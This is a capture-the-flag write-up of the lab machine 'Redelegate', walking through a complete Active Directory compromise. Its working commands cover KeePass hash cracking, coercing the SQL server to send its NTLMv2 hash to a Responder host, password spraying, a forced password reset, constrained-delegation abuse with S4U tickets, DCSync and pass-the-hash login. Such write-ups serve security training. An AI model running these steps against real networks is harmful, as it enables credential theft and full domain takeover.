Summary
#

Redelegate is a hard-difficulty Windows Active Directory machine that begins with anonymous FTP access, exposing a KeePass database containing credentials. After cracking the KeePass master password using contextual password patterns, valid MSSQL credentials are recovered and abused to enumerate domain users through SQL Server. Password reuse leads to the compromise of a domain user account with ForceChangePassword privileges over another user, enabling access to the Domain Controller via WinRM. Finally, by abusing SeEnableDelegationPrivilege together with GenericAll over a computer account, the attacker configures Constrained Delegation, impersonates a privileged Domain Admin account using S4U2Self/S4U2Proxy, performs a DCSync attack, and obtains full domain compromise.

Anonymous FTP Enumeration
#

The target allows anonymous authentication on the FTP service. Logging in with the username anonymous and a blank password grants access to the shared files.

└─$ ftp 10.129.234.50
Connected to 10.129.234.50.
220 Microsoft FTP Service
Name (10.129.234.50:flamo): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.

Listing the available files reveals two text documents and a KeePass database.

ftp> ls
10-20-24  01:11AM                  434 CyberAudit.txt
10-20-24  05:14AM                 2622 Shared.kdbx
10-20-24  01:26AM                  580 TrainingAgenda.txt

Before downloading the database, it is important to switch the FTP client into binary mode. The interactive FTP client uses ASCII mode by default, which converts line endings during transfer. While this is suitable for text files, it corrupts binary files such as Shared.kdbx.

ftp> get Shared.kdbx
150 Opening ASCII mode data connection.
...
WARNING! 10 bare linefeeds received in ASCII mode.
File may not have transferred correctly.

To preserve the file correctly, change the transfer mode before downloading:

ftp> binary
200 Type set to I.
ftp> get Shared.kdbx

Reviewing TrainingAgenda.txt reveals that users were being trained to avoid passwords following the pattern SeasonYear!.

Friday 18th October | 11.30 - 13.30 - 7 attendees
"Weak Passwords" - Why "SeasonYear!" is not a good password

The CyberAudit.txt file references an audit conducted in October 2024, making passwords such as Fall2024! or Autumn2024! good candidates.

To perform offline password cracking, we first extract the KeePass hash:

└─$ keepass2john Shared.kdbx > keepass.hash

Since KeePass2John prepends the filename (e.g., Shared.kdbx:$keepass$...), remove the filename before supplying the hash to Hashcat.

Using Hashcat with mode 13400 (KeePass 2) and a custom wordlist containing seasonal password combinations quickly recovers the master password:

└─$ hashcat -m 13400 keepass.hash custom_wordlist.txt

The recovered password is:

Fall2024!

With the master password recovered, install KeePass 2 and open the database:

└─$ sudo apt update && sudo apt install keepass2 -y

└─$ keepass2 Shared.kdbx

After authenticating with the recovered password, the KeePass database reveals different saved credentials.

We successfully login to the database service but there is no special database to enumerate nor are there any users that our current account can impersonate. We can steal the NTLMv2 challenge-response hash of the service account currently running the service via UNC path of our attacking machine and try to crack the hash if the account is configured with a weak password. First start Responder to catch the NTLMv2 challenge-response hash:

└─$ sudo responder -I tun0

Make sure the SMB server of Responder is running and then use the following UNC path listing command on the SQL Server:

SQL (SQLGuest  guest@master)> xp_dirtree \\10.10.15.86\share

Save the captured hash to a file and crack it with Hashcat using mode 5600:

└─$ hashcat -m 5600 sql_svcNTLMv2Hash.txt /usr/share/wordlists/rockyou.txt

The hash did not crack using rockyou.txt or any of the credentials recovered from the KeePass database. MSSQL service also allows us to perform rid brute-forcing to find domain accounts and this we can do with Netexec or Metasploit. Trying with Netexec didn’t work for me so I went with Metasploit auxiliary module method:

msf > use auxiliary/admin/mssql/mssql_enum_domain_accounts

The output revealed domain user accounts which we can save in a file and check for password reuse with the credentials we collected until now:

└─$ nxc smb 10.129.234.50 -u users.txt -p creds.txt

BloodHound Analysis
#

We can move towards collecting the domain information with BloodHound for visual analysis:

└─$ bloodhound-ce-python -c all -u 'Marie.Curie' -p 'Fall2024!' -d 'redelegate.vl' -ns 10.129.234.50 --dns-tcp --zip --dns-timeout 90

Analysing the privileges of our current user “Marie.Curie” revealed that she has ForceChangePassword over 6 domain user accounts.

We will reset the password of “HELEN.FROST” as this account is the only one present in the “Remote Management Users” group allowing us to log in to the host using WinRM:

To change the password of Helen.Frost:

└─$ bloodyad -u 'Marie.Curie' -p 'Fall2024!' -d redelegate.vl -i 10.129.234.50 set password 'HELEN.FROST' 'Helen@123'

[+] Password changed successfully!

After resetting the password, we can login using evil-wirnm:

└─$ evil-winrm -i 10.129.234.50 -u Helen.Frost -p 'Helen@123'

The user.txt can be found in “C:\Users\Helen.Frost\Desktop"

Escalating Privileges
#

Reviewing the privileges of other domain accounts that Marie.Curie has ForceChangePassword on didn’t reveal anything useful.

Identifying Delegation Abuse
#

Checking the system privileges of the “Helen.Frost” user revealed following output:

*Evil-WinRM* PS C:\Users\Helen.Frost\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                                                    State
============================= ============================================================== =======
SeMachineAccountPrivilege     Add workstations to domain                                     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                                       Enabled
SeEnableDelegationPrivilege   Enable computer and user accounts to be trusted for delegation Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set                                 Enabled

The “SeEnableDelegationPrivilege” is an important privilege as it allows users to configure domain accounts for Constrained or Unconstrained Delegation. The two are defined as:

  • Constrained Delegation: Allows a service to impersonate users only to specific services defined in the msDS-AllowedToDelegateTo attribute.

  • Unconstrained Delegation: Allows a service to impersonate users to any service without restrictions.

We have the possibility of performing the above two mentioned delegation attacks as the Helen.Frost also has GenericAll rights on a computer account:

For Unconstrained Delegation, we have following requirements:

  • Control over an account configured for Unconstrained Delegation (TRUSTED_FOR_DELEGATION).
  • Control over the account’s credentials (password, NTLM hash, or AES key).
  • The delegated account has a valid SPN.
  • Ability to modify DNS so the SPN hostname resolves to your attacker machine.
  • An attacker machine running krbrelayx.
  • Ability to coerce the target to authenticate.
  • The target authenticates using Kerberos (not NTLM).

Almost all of these requirements are satisfied except the ability to modify DNS which results in the following error when we try to add a DNS entry pointing to our attacking machine:

└─$ dnstool -u 'redelegate\Helen.Frost' -p 'Helen@123' -r roguecomputer.redelegate.vl -d 10.10.15.86 --action add 10.129.234.50

[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[!] LDAP operation failed. Message returned from server: insufficientAccessRights 00000005: SecErr: DSID-03152E29, problem 4003 (INSUFF_ACCESS_RIGHTS), data 0

Instead, we will abuse Constrained Delegation which has following requirements:

  • Control over a user or computer account.
  • The account has a valid SPN.
  • The account has the TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION flag enabled.
  • The target service SPN is present in the account’s msDS-AllowedToDelegateTo attribute.
  • Control over the account’s credentials (password, NTLM hash, or AES key).
  • A target user that is not marked as “Account is sensitive and cannot be delegated.”
  • Ability to request Kerberos S4U2Self and S4U2Proxy tickets (e.g., using getST.py or Rubeus).

We do not have DNS modifications requirement here and all of the above requirements are satisfied. As we have control over the “FS01” computer account and we have SeEnableDelegationPrivilege, we can set the required flag and attribute on the target.

Configuring Constrained Delegation
#

To enable S4U2Self, we first set the TRUSTED_TO_AUTH_FOR_DELEGATION flag on the computer account:

└─$ bloodyad -u 'Helen.Frost' -p 'Helen@123' -d 'redelegate.vl' -i '10.129.234.50' add uac 'FS01$' -f TRUSTED_TO_AUTH_FOR_DELEGATION

[+] ['TRUSTED_TO_AUTH_FOR_DELEGATION'] property flags added to FS01$'s userAccountControl

To verify the change, we need to see the values of UAC of the computer account object:

└─$ bloodyad -u 'Helen.Frost' -p 'Helen@123' -d 'redelegate.vl' -i '10.129.234.50' get object 'FS01$' --attr userAccountControl   

distinguishedName: CN=FS01,CN=Computers,DC=redelegate,DC=vl
userAccountControl: WORKSTATION_TRUST_ACCOUNT; TRUSTED_TO_AUTH_FOR_DELEGATION

The output confirmed that the flag is successfully added. To configure the constrained delegation, we can add any SPN service from the target (DC) to the computer account’s attribute “msDS-AllowedToDelegateTo” so that the computer account can impersonate users to that DC service. We add the LDAP SPN so the computer account can later impersonate users to LDAP and perform DCSync:

└─$ bloodyad -u 'Helen.Frost' -p 'Helen@123' -d 'redelegate.vl' -i '10.129.234.50' set object 'FS01$' msDS-AllowedToDelegateTo -v LDAP/DC.redelegate.vl

[+] FS01$'s msDS-AllowedToDelegateTo has been updated

We can confirm the attribute modification with:

└─$ bloodyad -u 'Helen.Frost' -p 'Helen@123' -d 'redelegate.vl' -i '10.129.234.50' get object 'FS01$' --attr msDS-AllowedToDelegateTo

distinguishedName: CN=FS01,CN=Computers,DC=redelegate,DC=vl
msDS-AllowedToDelegateTo: LDAP/DC.redelegate.vl

Now we need to reset the password of the computer account as we will use it when we perform the S4U2Self and S4U2Proxy attack with impacket-getST:

└─$ bloodyad -u 'Helen.Frost' -p 'Helen@123' -d 'redelegate.vl' -i '10.129.234.50' set password 'FS01$' 'Fs01@123'

[+] Password changed successfully!

S4U Attack and DCSync
#

It’s time to ask the TGS of the account we want to impersonate to the LDAP service. As the Domain Admin’s account is marked as sensitive, we cannot impersonate it to the target service. There is another user who is a member of the “Domain Admins” group and is not marked as sensitive.

As this user has the same privileges the Domain Admin has, we can successfully impersonate it to the target service:

└─$ impacket-getST redelegate.vl/'FS01$':'Fs01@123' -spn 'LDAP/DC.redelegate.vl' -impersonate 'RYAN.COOPER' -dc-ip 10.129.234.50

Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating RYAN.COOPER
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in RYAN.COOPER@LDAP_DC.redelegate.vl@REDELEGATE.VL.ccache

We can set the ticket in the environment variable “KRB5CCNAME” to use with impacket tools:

└─$ export KRB5CCNAME=RYAN.COOPER@LDAP_DC.redelegate.vl@REDELEGATE.VL.ccache

Now to perform a DCSync attack and get the Administrator’s NT hash:

└─$ impacket-secretsdump redelegate.vl/RYAN.COOPER@DC.redelegate.vl -k -no-pass -just-dc-user Administrator

With the NT hash, we can login to the target as Administrator using evil-winrm:

└─$ evil-winrm -i 10.129.234.50 -u Administrator -H '<NT-Hash>'

The root.txt can be found in the Administrator’s Desktop
